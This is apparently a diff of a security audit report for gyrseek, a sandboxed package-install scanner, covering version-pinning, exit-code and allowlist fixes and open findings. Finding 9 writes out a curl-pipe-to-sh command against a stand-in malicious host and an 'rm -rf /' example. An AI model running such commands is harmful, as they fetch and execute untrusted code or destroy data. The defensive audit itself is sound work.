-## Finding 7 — Medium | `parsing.rs:576`
-
-**Summary:** `rewrite_args_with_pinned_versions` strips extras before looking up the package in the `pins` map, but `pins` is keyed by the full name including extras, so the lookup always misses and the version is forwarded unpinned.
-
-**Root cause:** The `pins` map is built by `scan_many_with_cache` using the package name as returned by the parser — `requests[security]` for an extras-qualified requirement. `rewrite_args_with_pinned_versions` does:
-
-```rust
-let base_name = arg.split('[').next().unwrap_or(arg);
-if let Some(version) = pins.get(base_name) { ... }
-```
-
-`pins.get("requests")` returns `None` because the key is `"requests[security]"`. The argument is forwarded as the original unpinned spec, re-opening the time-of-check/time-of-use gap the pinning was designed to close.
-
-**Failure scenario:** `pip install requests[security]` is scanned at version `2.31.0`. A new version `2.32.0` containing a backdoor is published between the scan and the forwarded install. The forwarded command is `pip install requests[security]` (unpinned). pip resolves `2.32.0` and installs it. gyrseek exits 0.
-
-**Fix direction:** Normalize package names consistently throughout the pipeline. Either: (a) strip extras at parse time and pass only the canonical name as the `pins` key, or (b) in `rewrite_args_with_pinned_versions`, try both `base_name` and the full name when looking up `pins`.
-
-**✅ Fix status — FIXED via option (a).** Because #6 strips extras at parse time, the parser now emits the canonical name `requests`, so `scan_many_with_cache` keys `pins` by `requests`. `rewrite_args_with_pinned_versions` looks the package up with the same `strip_pep508_extras(arg)` helper and re-emits the **full** original `arg` (extras intact) with the pin appended:
-
-```rust
-let base_name = strip_pep508_extras(arg);
-if let Some(version) = pins.get(base_name) {
-    out.push(format!("{}=={}", arg, version));   // e.g. requests[security]==2.31.0
-}
-```
-
-`pip install requests[security]` is now forwarded as `pip install requests[security]==2.31.0`, closing the TOCTOU gap while preserving the extras the install needs. (`parsing.rs:583`; test `pins_extras_spec_using_canonical_key_and_preserves_extras`, plus the pre-existing `pins_pip_package_with_extras`.)
+**✅ Fix status — FIXED.** A shared `strip_pep508_extras(name) -> &str` helper (splits on the first `[`) is applied at every parse boundary that feeds a registry lookup or the `pins` key. `requests[security]==2.31.0` now parses to canonical name `requests`; the PyPI URL is valid; the original spec with extras is preserved for the forwarded install command. (`parsing.rs:291`, applied at `295–312` and `645–651`; tests `strip_pep508_extras_removes_bracket_suffix` and `strips_pep508_extras_from_requirements_name`.)
 
 ---
 
-## Finding 8 — Medium | `lib.rs:536`
+## Finding 7 — Medium | `parsing.rs:576` | ✅ Fixed
 
-**Summary:** The child process exit status is discarded. If the host package manager exits non-zero, gyrseek exits 0, misreporting a failed install as successful.
+**Summary:** `rewrite_args_with_pinned_versions` strips extras before looking up the package in the `pins` map, but `pins` is keyed by the full name including extras, so the lookup misses and the install is forwarded unpinned.
 
-**Root cause:** `forward_args` spawns the child and calls `wait()` but discards the result:
+**Root cause:** The `pins` map was keyed by the full parser output — `requests[security]` — but the rewrite function looked up `requests` (after stripping extras). `pins.get("requests")` returns `None` → the argument is forwarded as the original unpinned spec, reopening the TOCTOU gap.
 
-```rust
-Ok(mut child) => {
-    let _ = child.wait();
-}
-```
+**Failure scenario:** `pip install requests[security]` is scanned at `2.31.0`. A malicious `2.32.0` is published before the forwarded install runs. The forwarded command is `pip install requests[security]` (unpinned) → pip resolves `2.32.0` → installed.
 
-**Failure scenario:** An AI coding agent runs `gyrseek npm install nonexistent-package@99.0.0`. Gyrseek scans, finds it clean, forwards to npm. npm exits 1 (version not found). The `ExitStatus` is dropped. Gyrseek exits 0. The agent interprets this as a successful install and continues, producing broken builds or runtime failures attributed to unrelated code. Any CI pipeline that checks `$?` after a gyrseek-wrapped install will be misled.
+**Fix direction:** Normalize `pins` keys and the rewrite lookup to use the same canonical (extras-stripped) name, re-emitting the full spec with extras when building the pinned argument.
 
-**Fix direction:**
-
-```rust
-Ok(mut child) => {
-    if let Ok(status) = child.wait() {
-        if !status.success() {
-            std::process::exit(status.code().unwrap_or(1));
-        }
-    }
-}
-```
-
-**✅ Fix status — FIXED.** `forward_args` now matches on the wait result and propagates the host manager's status, and also fails closed if the wait itself errors:
-
-```rust
-match child.wait() {
-    Ok(status) if status.success() => {}
-    Ok(status) => std::process::exit(status.code().unwrap_or(1)),
-    Err(e) => { println!("❌ [gyrseek] Failed to wait on host command ..."); std::process::exit(1); }
-}
-```
-
-A failed forwarded install (e.g. `npm install nonexistent@99.0.0` exiting 1) now makes gyrseek exit with the same non-zero code, so agents and CI `$?` checks are no longer misled. (`lib.rs:540–550`; integration tests `forwarding_propagates_host_nonzero_exit_status` and `forwarding_preserves_host_success_exit_status` in `tests/forward_fail_closed_tests.rs` — exit codes are only observable from a child process, so these correctly live as integration tests.)
+**✅ Fix status — FIXED via canonical keying (coordinated with #6).** Because #6 strips extras at parse time, `pins` is now keyed by `requests`. The rewrite looks up with `strip_pep508_extras(arg)` and re-emits `arg==version` (full spec with extras intact): `requests[security]==2.31.0`. (`parsing.rs:583`; test `pins_extras_spec_using_canonical_key_and_preserves_extras`.)
 
 ---
 
-## Summary Table
+## Finding 8 — Medium | `lib.rs:536` | ✅ Fixed
 
-| #   | File          | Line | Severity | One-line description                                            |
-| --- | ------------- | ---- | -------- | --------------------------------------------------------------- |
-| 1   | `sandbox.rs`  | 188  | Critical | Empty trace on strace failure passes as clean scan              |
-| 2   | `scanning.rs` | 199  | Critical | PTR-record domain allowlist bypassable by attacker              |
-| 3   | `scanning.rs` | 427  | High     | Argv regex `[^\]]*` truncates at first `]` in any argument      |
-| 4   | `sandbox.rs`  | 307  | High     | `\|\| true` suppresses strace failures — root cause of #1       |
-| 5   | `parsing.rs`  | 113  | High     | Poetry non-develop local-path packages leak through filter      |
-| 6   | `parsing.rs`  | 298  | Medium   | PEP 508 extras in package name cause PyPI 404 → zero baselines  |
-| 7   | `parsing.rs`  | 576  | Medium   | Extras key mismatch breaks version pinning in forwarded command |
-| 8   | `lib.rs`      | 536  | Medium   | Child process exit status discarded — failed installs exit 0    |
+**Summary:** The child process exit status is discarded — if the host package manager exits non-zero, gyrseek exits 0 and misreports a failed install as successful.
 
-**Chains:**
+**Root cause:** `forward_args` called `let _ = child.wait()`, discarding the `ExitStatus`.
 
-- #4 → #1: strace errors suppressed → empty log file → empty trace → bypass
-- #6 → #7: extras break PyPI lookup AND break version pinning for the same package
+**Failure scenario:** An AI agent runs `gyrseek npm install nonexistent@99.0.0`. gyrseek scans (clean), forwards to npm. npm exits 1. gyrseek exits 0. The agent assumes the install succeeded and continues, producing broken builds blamed on unrelated code.
+
+**Fix direction:** Match on `child.wait()`, propagate a non-zero status with `std::process::exit`, and fail closed if `wait()` itself errors.
+
+**✅ Fix status — FIXED.** `forward_args` now propagates the host manager's exit code. (`lib.rs:540–550`; integration tests `forwarding_propagates_host_nonzero_exit_status` and `forwarding_preserves_host_success_exit_status` in `tests/forward_fail_closed_tests.rs`.)
+
+---
+
+## Finding 9 — Medium | `lib.rs` | ✅ Fixed
+
+**Summary:** Unrecognized managers were silently forwarded unscanned, violating gyrseek's core contract.
+
+**Root cause:** The `run()` fallback called `forward_original_command()` for any manager that `should_enforce_package_detection` returned `false` for — which includes every unrecognized command. `gyrseek ls`, `gyrseek curl https://...`, and `gyrseek rm -rf /` all executed unscanned.
+
+**Failure scenario:** A misconfigured CI pipeline uses `gyrseek curl https://malicious.example/bootstrap.sh | sh`. gyrseek forwards it silently and exits 0 — no scan, no warning, full false assurance.
+
+**Fix direction:** Add an upfront allowlist check before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` (except `sandbox runtimes`) should exit 1 with a clear message.
+
+**✅ Fix status — FIXED.** `SUPPORTED_MANAGERS` allowlist added at `lib.rs:769`. Unrecognized managers exit 1 with:
+```
+❌ [gyrseek] Unrecognized manager 'curl'. Supported managers: pip, pip3, uv, poetry, npm. Failing closed.
+```
+
+---
+
+## Finding 10 — Critical | `scanning.rs:654` | ⚠️ Open
+
+**Summary:** `select_effective_baselines` inserts baseline override versions without checking equality to `current`; a self-referencing override disables all anomaly detection for the affected package.
+
+**Root cause:** The `v != current` guard on line 666 only applies to versions pulled from `fetched_baselines`. The override insertion block (lines 654–660) unconditionally pushes `override_m1` and `override_m2` regardless of value. When an override version equals the version being scanned, the sandbox deduplicates the current + baseline probes to a single run. `current_signals.difference(baseline_signals)` is always empty — every signal type returns no anomalies → `allowed: true`.
+
+**Failure scenario:** Config: `baseline_overrides: {evil-pkg: {baseline-1: "1.3.0"}}`. User installs `evil-pkg@1.3.0` (same version). `select_effective_baselines` returns `["1.3.0"]` as the baseline. Probe deduplication collapses to one trace run. All diffs are empty → `allowed: true`, regardless of what `1.3.0` actually does during install.
+
+**Note:** This is a configuration footgun, not a remote exploit. The test `override_equal_to_current_is_included_as_baseline_producing_empty_diff` documents the behavior but does not fix it.
+
+**Fix direction:** Add a `v != current` guard to the override insertion block (lines 654–660), matching the guard already applied to `fetched_baselines` on line 666. Emit a `⚠️ [gyrseek]` warning when a configured override version equals the version being scanned.
+
+---
+
+## Finding 11 — High | `parsing.rs:468` | ⚠️ Open
+
+**Summary:** When all npm CLI args are non-registry specs (`file:`, `git+`, `https://`, `link:`), the package.json fallback fires and scans unrelated registry dependencies; any policy hit on those deps blocks the install the user actually requested.
+
+**Root cause:** `parse_npm_install_packages_from_args` correctly filters non-registry specs, but when all args are filtered, `packages` is empty and the `!packages.is_empty()` guard falls through to the `package.json` fallback. That fallback reads all `dependencies`, `devDependencies`, etc. — none of which were part of the user's command — and returns them as scan targets.
+
+**Failure scenario:** User runs `gyrseek npm install file:../local-pkg`. Arg filtered → `packages=[]`. `package.json` lists `moment` published 10 minutes ago. `minimum_release_age_package: 1` is configured. `scan_many_with_cache` blocks on `moment`. `exit(1)`. The local-file install never runs.
+
+**Chained with:** Finding 12 — same root cause when no `package.json` exists.
+
+**Fix direction:** When all CLI args are non-registry specs, forward the command directly without scanning. The package.json fallback should only fire when the user typed `npm install` with no arguments at all.
+
+---
+
+## Finding 12 — High | `lib.rs:1021` | ⚠️ Open
+
+**Summary:** When all npm CLI args are non-registry specs and no `package.json` exists, gyrseek exits 1, blocking a valid local or URL-based install.
+
+**Root cause:** Same filter path as Finding 11. With no `package.json` in the working directory, the fallback returns `Vec::new()`. Back in `lib.rs`, `npm_packages.is_empty()` → `std::process::exit(1)`.
+
+**Failure scenario:** A C++ project that pulls one npm utility runs `gyrseek npm install https://registry.example.com/tool.tgz`. No `package.json` exists. All args filtered → `packages=[]` → fallback fails → `exit(1)`. Valid install blocked.
+
+**Fix direction:** Same as Finding 11 — treat the all-non-registry-args case as a passthrough rather than fail-closed.
+
+---
+
+## Finding 13 — Medium | `scanning.rs:1852` | ⚠️ Open
+
+**Summary:** Async scan tests set/remove an env var with bare `unsafe` calls and no drop-guard; a panic between the two leaves the var set and may poison the shared `Mutex`, masking the real failure with cascade lock-poison panics.
+
+**Root cause:** The `env_lock` `OnceLock<Mutex<()>>` serialises env-var access across async tests, but `GYRSEEK_TEST_FORCE_RELEASES_LAST_24H` is set and removed with bare `unsafe` calls bracketing the async work. If an assertion panics after `set_var` but before `remove_var`, the Mutex may be poisoned. Every subsequent `env_lock().lock().expect("env lock")` then panics with `PoisonError`.
+
+**Failure scenario:** An assertion in `flags_newly_introduced_bun_execution` fails after `set_var`. Mutex poisoned. Next test calls `env_lock().lock().expect("env lock")` → panics. Test output shows 6 misleading lock-poison failures masking the one real assertion failure.
+
+**Fix direction:** Wrap the env-var cleanup in a RAII drop-guard:
+```rust
+struct EnvGuard(&'static str);
+impl Drop for EnvGuard {
+    fn drop(&mut self) { unsafe { std::env::remove_var(self.0) } }
+}
+```
+
+---
+
+## Finding 14 — Low | `parsing.rs:880` | ⚠️ Open
+
+**Summary:** A test writes a temp requirements file but only removes it on the success path — assertion failures leave the file on disk.
+
+**Root cause:** `let _ = std::fs::remove_file(req_path)` is placed after the `assert_eq!` calls. A panicking assertion skips the removal.
+
+**Failure scenario:** Any `assert_eq!` in the test panics → temp file accumulates across repeated runs. Low impact in practice (OS temp cleanup handles it) but adds noise in CI.
+
+**Fix direction:** Use `tempfile::NamedTempFile` (already a project dependency), which removes the file automatically on drop.
+
+---
+
+## Review history
+
+### Round 1 — 2026-06-09
+
+Initial static review of `sandbox.rs`, `scanning.rs`, `parsing.rs`, `lib.rs`. Produced findings #1–8.
+
+**Verification (against HEAD `7a6d073`):** All 8 findings confirmed accurate. Caveat on #6: the downstream outcome of zero baselines is a silent skip-and-allow for unexempted packages (not always a false-positive block as originally stated — arguably worse). Findings #1 and #4 are one bug expressed as root cause + effect.
+
+### Round 1 fixes — 2026-06-09
+
+All 8 findings fixed with co-located regression coverage. See individual fix notes above.
+
+**Follow-on environment fix (surfaced by #1/#4):** Once #1 made tracing failures fail closed, real runs began blocking with `strace: ptrace(PTRACE_SEIZE): Operation not permitted`. Root cause: the sandbox container ran without `CAP_SYS_PTRACE`. Because strace drops the install to the unprivileged `gyrseek` user (`strace -u`), cross-UID attach requires this capability, which Docker does not grant by default. The old code hid this by treating empty traces as clean. Fixed by adding `--cap-add SYS_PTRACE` to the container run args (`sandbox.rs:376–377`; test `docker_args_grant_sys_ptrace_capability`). The capability is scoped to the container's PID namespace and cannot trace host processes.
+
+### Round 1 runtime verification — 2026-06-10, `GYRSEEK_SANDBOX=docker`
+
+All 8 fixes independently verified against the built binary. Key observations:
+
+| # | Verification method | Result |
+|---|---|---|
+| 1 | Live docker scan (`npm install lodash`) — real strace trace, clear report | ✅ |
+| 2 | FCrDNS unit tests (3 tests) | ✅ 3 passed |
+| 3 | `extract_process_exec_preserves_brackets_in_argv` | ✅ 1 passed |
+| 4 | `matrix_script_captures_strace_stderr_not_devnull` | ✅ 1 passed |
+| 5 | `poetry install` with `../mylib` + `requests` in lockfile — only 1 package scanned | ✅ |
+| 6 | `pip install 'requests[security]==2.31.0'` — registry lookup for `requests`, valid baselines | ✅ |
+| 7 | `pins_extras_spec_using_canonical_key_and_preserves_extras` | ✅ 1 passed |
+| 8 | Binary exits 1 on failed install, exits 0 on success | ✅ |
+| 9 | `gyrseek ls`, `curl`, `rm` all rejected; `sandbox runtimes` and real scans unaffected | ✅ |
+
+### Round 2 — 2026-06-10
+
+Review of `Fixing-findings` branch (test inlining, visibility reduction, coverage-gap tests, `is_non_registry_npm_spec` CLI fix, `uv lock -P` idx fix). Produced findings #10–14.
